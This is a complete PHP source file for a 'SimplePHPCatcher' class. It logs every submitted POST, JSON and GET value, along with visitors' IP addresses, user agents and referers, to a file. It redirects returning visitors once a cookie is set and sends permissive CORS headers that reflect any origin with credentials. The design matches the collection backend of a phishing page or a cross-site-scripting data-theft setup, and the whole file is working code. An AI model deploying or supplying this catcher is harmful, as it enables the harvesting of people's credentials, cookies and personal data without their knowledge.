<?php

/**
 * Simple PHP Catcher file
 */

class SimplePHPCatcher
{
    protected $OutputFile;
    protected $RedirectURL;
    protected $DataToCatch;
    protected $RememberCookieName;

    function __construct($outputFile, $redirectURL = null, $dataToCatch = ['REMOTE_ADDR', 'HTTP_USER_AGENT', 'HTTP_REFERER'], $rememberCookieName = "rememberme")
    {
        $this->OutputFile = $outputFile;
        $this->RedirectURL = $redirectURL;
        $this->DataToCatch = $dataToCatch;
        $this->RememberCookieName = $rememberCookieName;
    }

    function catch()
    {
        $data = "";

        // POST data
        foreach ($_POST as $key => $post) {
            $data .= $key . " : " . $post . "\n";
        }

        // JSON data
        $jsonData = json_decode(file_get_contents('php://input'));
        if ($jsonData) {
            $data .= var_export($jsonData, true) . "\n";
        }

        // GET data
        foreach ($_GET as $key => $get) {
            $data .= $key . " : " . $get . "\n";
        }

        // SERVER data
        foreach ($this->DataToCatch as $key => $serverData) {
            $data .= isset($_SERVER[$serverData]) ? $serverData . " : " . $_SERVER[$serverData] . "\n" : "";
        }

        // Separator
        $data .= "=================\n";


        // Store data
        $this->store($data);
        
    }

    function setRememberCookie() {
        setcookie($this->RememberCookieName, 1, time()+36000);
    }

    function redirectOnCookie() 
    {
        if (isset($_COOKIE[$this->RememberCookieName])) {
            $this->redirect();
        }
    }

    function redirect()
    {
        if ($this->RedirectURL !== null)
        {
            header("Location: " . $this->RedirectURL);
            exit;
        }
    }

    protected function store($data)
    {
        file_put_contents($this->OutputFile, $data, FILE_APPEND);
    }

    function cors() {
        // Allow from any origin
        if (isset($_SERVER['HTTP_ORIGIN'])) {
            header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
            header('Access-Control-Allow-Credentials: true');
            header('Access-Control-Max-Age: 604800');
        }
        
        if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
            if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD'])) {
                header("Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, PATCH, HEAD");         
            }
            
            if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS'])) {
                header("Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}");
            }
        }
    }
}
